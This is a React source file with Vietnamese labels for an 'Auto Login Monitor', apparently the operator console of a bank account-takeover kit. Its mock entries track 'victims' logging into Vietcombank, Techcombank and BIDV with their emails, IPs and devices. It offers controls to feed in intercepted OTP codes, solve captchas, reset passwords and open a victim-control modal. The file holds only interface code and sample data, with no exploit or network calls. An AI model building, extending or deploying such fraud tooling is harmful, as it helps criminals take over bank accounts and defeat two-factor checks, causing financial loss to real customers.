/**
 * Auto Login Monitor Component
 * Giám sát và can thiệp vào quá trình Auto Login
 */

import React, { useState, useEffect } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "../ui/card";
import { Button } from "../ui/button";
import { Input } from "../ui/input";
import { Badge } from "../ui/badge";
import { ScrollArea } from "../ui/scroll-area";
import { motion, AnimatePresence } from "framer-motion";
import {
  Eye,
  Play,
  Pause,
  RotateCcw,
  Shield,
  Key,
  CheckCircle,
  XCircle,
  Clock,
  User,
  Globe,
  MapPin,
  Monitor,
  AlertTriangle,
  Zap,
  Settings,
  MessageSquare,
  Phone,
  Mail,
  Lock,
  Unlock,
  RefreshCw,
  Activity
} from "lucide-react";
import { format } from "date-fns";
import { vi } from "date-fns/locale";
import toast from "react-hot-toast";
import VictimManagementModal from "./VictimManagementModal";

const AutoLoginMonitor = () => {
  const [activeRequests, setActiveRequests] = useState([]);
  const [selectedRequest, setSelectedRequest] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [interventionMode, setInterventionMode] = useState(false);

  // Mock auto login requests data
  const mockRequests = [
    {
      id: "AL001",
      victimId: "Target_User_001",
      website: "banking.vietcombank.com.vn",
      username: "nguyenvana@gmail.com",
      status: "waiting_otp",
      progress: 75,
      startTime: new Date("2025-01-15T08:20:00"),
      lastActivity: new Date("2025-01-15T08:23:30"),
      ip: "192.168.1.50",
      location: "Hà Nội, VN",
      device: "Windows 11 - Chrome 120",
      steps: [
        { step: "navigate", status: "completed", time: "08:20:15", description: "Điều hướng đến trang đăng nhập" },
        { step: "fill_username", status: "completed", time: "08:20:45", description: "Nhập tên đăng nhập" },
        { step: "fill_password", status: "completed", time: "08:21:10", description: "Nhập mật khẩu" },
        { step: "submit_login", status: "completed", time: "08:21:30", description: "Gửi form đăng nhập" },
        { step: "wait_otp", status: "in_progress", time: "08:22:00", description: "Chờ mã OTP" },
        { step: "fill_otp", status: "pending", time: null, description: "Nhập mã OTP" },
        { step: "complete", status: "pending", time: null, description: "Hoàn thành đăng nhập" }
      ],
      needsIntervention: true,
      interventionType: "otp_required",
      otpMethod: "sms"
    },
    {
      id: "AL002",
      victimId: "Target_User_002",
      website: "techcombank.com.vn",
      username: "tranthib@yahoo.com",
      status: "captcha_challenge",
      progress: 45,
      startTime: new Date("2025-01-15T08:18:00"),
      lastActivity: new Date("2025-01-15T08:24:10"),
      ip: "192.168.1.75",
      location: "TP.HCM, VN",
      device: "Windows 10 - Chrome 119",
      steps: [
        { step: "navigate", status: "completed", time: "08:18:15", description: "Điều hướng đến trang đăng nhập" },
        { step: "fill_username", status: "completed", time: "08:18:45", description: "Nhập tên đăng nhập" },
        { step: "fill_password", status: "completed", time: "08:19:10", description: "Nhập mật khẩu" },
        { step: "solve_captcha", status: "failed", time: "08:19:45", description: "Giải captcha thất bại" },
        { step: "retry_captcha", status: "in_progress", time: "08:24:00", description: "Thử lại captcha" }
      ],
      needsIntervention: true,
      interventionType: "captcha_failed",
      retryCount: 3
    },
    {
      id: "AL003",
      victimId: "Target_User_003",
      website: "bidv.com.vn",
      username: "lequangc@gmail.com",
      status: "success",
      progress: 100,
      startTime: new Date("2025-01-15T08:15:00"),
      lastActivity: new Date("2025-01-15T08:17:30"),
      ip: "192.168.1.120",
      location: "Đà Nẵng, VN",
      device: "Windows 11 - Chrome 121",
      steps: [
        { step: "navigate", status: "completed", time: "08:15:15", description: "Điều hướng đến trang đăng nhập" },
        { step: "fill_username", status: "completed", time: "08:15:45", description: "Nhập tên đăng nhập" },
        { step: "fill_password", status: "completed", time: "08:16:10", description: "Nhập mật khẩu" },
        { step: "submit_login", status: "completed", time: "08:16:30", description: "Gửi form đăng nhập" },
        { step: "complete", status: "completed", time: "08:17:30", description: "Đăng nhập thành công" }
      ],
      needsIntervention: false,
      interventionType: null
    }
  ];

  useEffect(() => {
    setActiveRequests(mockRequests);
    
    // Simulate real-time updates
    const interval = setInterval(() => {
      setActiveRequests(prev => prev.map(request => ({
        ...request,
        lastActivity: new Date(),
        progress: request.status === 'in_progress' ? Math.min(request.progress + Math.random() * 5, 95) : request.progress
      })));
    }, 3000);

    return () => clearInterval(interval);
  }, []);

  const getStatusBadge = (status) => {
    const statusConfig = {
      waiting_otp: { color: "bg-yellow-500/20 text-yellow-400", label: "Chờ OTP" },
      captcha_challenge: { color: "bg-orange-500/20 text-orange-400", label: "Captcha" },
      in_progress: { color: "bg-blue-500/20 text-blue-400", label: "Đang xử lý" },
      success: { color: "bg-green-500/20 text-green-400", label: "Thành công" },
      failed: { color: "bg-red-500/20 text-red-400", label: "Thất bại" },
      paused: { color: "bg-gray-500/20 text-gray-400", label: "Tạm dừng" }
    };

    const config = statusConfig[status] || statusConfig.in_progress;
    return <Badge className={config.color}>{config.label}</Badge>;
  };

  const getStepIcon = (status) => {
    switch (status) {
      case 'completed':
        return <CheckCircle className="h-4 w-4 text-green-400" />;
      case 'in_progress':
        return <Clock className="h-4 w-4 text-blue-400 animate-spin" />;
      case 'failed':
        return <XCircle className="h-4 w-4 text-red-400" />;
      default:
        return <div className="h-4 w-4 rounded-full border-2 border-slate-600" />;
    }
  };

  const handleIntervention = (requestId, action, data = {}) => {
    setActiveRequests(prev => prev.map(request => 
      request.id === requestId 
        ? {
            ...request,
            lastActivity: new Date(),
            steps: request.steps.map(step => 
              step.status === 'in_progress' 
                ? { ...step, status: 'completed', time: format(new Date(), "HH:mm:ss") }
                : step
            )
          }
        : request
    ));

    switch (action) {
      case 'provide_otp':
        toast.success(`Đã cung cấp OTP: ${data.otp} cho ${requestId}`);
        break;
      case 'solve_captcha':
        toast.success(`Đã giải captcha cho ${requestId}`);
        break;
      case 'reset_password':
        toast.success(`Đã reset mật khẩu cho ${requestId}`);
        break;
      case 'pause':
        toast.info(`Đã tạm dừng ${requestId}`);
        break;
      case 'resume':
        toast.info(`Đã tiếp tục ${requestId}`);
        break;
      case 'abort':
        toast.error(`Đã hủy ${requestId}`);
        break;
      default:
        toast.info(`Thao tác ${action} cho ${requestId}`);
    }
  };

  const openVictimControl = (request) => {
    const victim = {
      id: request.victimId,
      ip: request.ip,
      location: request.location,
      device: request.device,
      status: 'online',
      os: request.device.split(' - ')[0],
      browser: request.device.split(' - ')[1],
      lastSeen: format(request.lastActivity, "HH:mm:ss")
    };
    
    setSelectedRequest(victim);
    setIsModalOpen(true);
  };

  return (
    <>
      <Card className="bg-gradient-to-br from-slate-900/95 to-slate-800/95 border-slate-700">
        <CardHeader>
          <CardTitle className="flex items-center justify-between text-white">
            <div className="flex items-center gap-2">
              <Activity className="h-5 w-5 text-green-400" />
              <span>Auto Login Monitor</span>
            </div>
            <div className="flex items-center gap-2">
              <Badge className="bg-blue-500/20 text-blue-400">
                {activeRequests.filter(r => r.status !== 'success' && r.status !== 'failed').length} Active
              </Badge>
              <Button
                size="sm"
                variant={interventionMode ? "default" : "outline"}
                onClick={() => setInterventionMode(!interventionMode)}
                className={interventionMode ? "bg-red-500 hover:bg-red-600" : ""}
              >
                <Shield className="h-4 w-4 mr-1" />
                {interventionMode ? "Intervention ON" : "Monitor Mode"}
              </Button>
            </div>
          </CardTitle>
        </CardHeader>

        <CardContent className="space-y-4">
          <ScrollArea className="h-[600px]">
            <div className="space-y-4">
              <AnimatePresence>
                {activeRequests.map((request, index) => (
                  <motion.div
                    key={request.id}
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0, y: -20 }}
                    transition={{ delay: index * 0.1 }}
                    className="bg-slate-800/50 rounded-lg p-4 border border-slate-700"
                  >
                    {/* Request Header */}
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-3">
                        <div className="flex items-center gap-2">
                          <Globe className="h-4 w-4 text-blue-400" />
                          <span className="font-medium text-white">{request.website}</span>
                        </div>
                        {getStatusBadge(request.status)}
                        {request.needsIntervention && (
                          <Badge className="bg-red-500/20 text-red-400 animate-pulse">
                            <AlertTriangle className="h-3 w-3 mr-1" />
                            Cần can thiệp
                          </Badge>
                        )}
                      </div>
                      
                      <div className="flex items-center gap-2">
                        <span className="text-sm text-slate-400">
                          {format(request.lastActivity, "HH:mm:ss")}
                        </span>
                        <Button
                          size="sm"
                          variant="ghost"
                          onClick={() => openVictimControl(request)}
                          className="text-blue-400 hover:text-blue-300"
                        >
                          <Monitor className="h-4 w-4" />
                        </Button>
                      </div>
                    </div>

                    {/* Request Info */}
                    <div className="grid grid-cols-2 md:grid-cols-4 gap-3 mb-3 text-sm">
                      <div className="flex items-center gap-2 text-slate-300">
                        <User className="h-3 w-3" />
                        <span>{request.victimId}</span>
                      </div>
                      <div className="flex items-center gap-2 text-slate-300">
                        <Mail className="h-3 w-3" />
                        <span className="truncate">{request.username}</span>
                      </div>
                      <div className="flex items-center gap-2 text-slate-300">
                        <MapPin className="h-3 w-3" />
                        <span>{request.location}</span>
                      </div>
                      <div className="flex items-center gap-2 text-slate-300">
                        <Clock className="h-3 w-3" />
                        <span>{format(request.startTime, "HH:mm:ss")}</span>
                      </div>
                    </div>

                    {/* Progress Bar */}
                    <div className="mb-3">
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-sm text-slate-400">Tiến độ</span>
                        <span className="text-sm text-slate-300">{request.progress}%</span>
                      </div>
                      <div className="w-full bg-slate-700 rounded-full h-2">
                        <div
                          className="bg-gradient-to-r from-blue-500 to-green-500 h-2 rounded-full transition-all duration-500"
                          style={{ width: `${request.progress}%` }}
                        />
                      </div>
                    </div>

                    {/* Steps Timeline */}
                    <div className="mb-4">
                      <div className="text-sm text-slate-400 mb-2">Các bước thực hiện:</div>
                      <div className="space-y-2">
                        {request.steps.map((step, stepIndex) => (
                          <div key={stepIndex} className="flex items-center gap-3 text-sm">
                            {getStepIcon(step.status)}
                            <span className={`flex-1 ${
                              step.status === 'completed' ? 'text-slate-300' :
                              step.status === 'in_progress' ? 'text-blue-400' :
                              step.status === 'failed' ? 'text-red-400' :
                              'text-slate-500'
                            }`}>
                              {step.description}
                            </span>
                            {step.time && (
                              <span className="text-slate-500 text-xs">{step.time}</span>
                            )}
                          </div>
                        ))}
                      </div>
                    </div>

                    {/* Intervention Controls */}
                    {interventionMode && request.needsIntervention && (
                      <div className="border-t border-slate-700 pt-3">
                        <div className="text-sm text-slate-400 mb-2">Thao tác can thiệp:</div>
                        <div className="flex flex-wrap gap-2">
                          {request.interventionType === 'otp_required' && (
                            <>
                              <div className="flex items-center gap-2">
                                <Input
                                  placeholder="Nhập OTP..."
                                  className="w-24 h-8 text-sm bg-slate-700 border-slate-600"
                                />
                                <Button
                                  size="sm"
                                  onClick={() => handleIntervention(request.id, 'provide_otp', { otp: '123456' })}
                                  className="bg-green-600 hover:bg-green-700"
                                >
                                  <Key className="h-3 w-3 mr-1" />
                                  Gửi OTP
                                </Button>
                              </div>
                              <Button
                                size="sm"
                                variant="outline"
                                onClick={() => handleIntervention(request.id, 'request_otp')}
                              >
                                <Phone className="h-3 w-3 mr-1" />
                                Yêu cầu OTP mới
                              </Button>
                            </>
                          )}
                          
                          {request.interventionType === 'captcha_failed' && (
                            <Button
                              size="sm"
                              onClick={() => handleIntervention(request.id, 'solve_captcha')}
                              className="bg-orange-600 hover:bg-orange-700"
                            >
                              <Eye className="h-3 w-3 mr-1" />
                              Giải Captcha
                            </Button>
                          )}

                          <Button
                            size="sm"
                            variant="outline"
                            onClick={() => handleIntervention(request.id, 'pause')}
                          >
                            <Pause className="h-3 w-3 mr-1" />
                            Tạm dừng
                          </Button>
                          
                          <Button
                            size="sm"
                            variant="outline"
                            onClick={() => handleIntervention(request.id, 'reset_password')}
                          >
                            <RotateCcw className="h-3 w-3 mr-1" />
                            Reset
                          </Button>
                          
                          <Button
                            size="sm"
                            variant="outline"
                            className="text-red-400 border-red-400 hover:bg-red-400/10"
                            onClick={() => handleIntervention(request.id, 'abort')}
                          >
                            <XCircle className="h-3 w-3 mr-1" />
                            Hủy
                          </Button>
                        </div>
                      </div>
                    )}
                  </motion.div>
                ))}
              </AnimatePresence>
            </div>
          </ScrollArea>
        </CardContent>
      </Card>

      <VictimManagementModal
        victim={selectedRequest}
        isOpen={isModalOpen}
        onClose={() => {
          setIsModalOpen(false);
          setSelectedRequest(null);
        }}
      />
    </>
  );
};

export default AutoLoginMonitor;
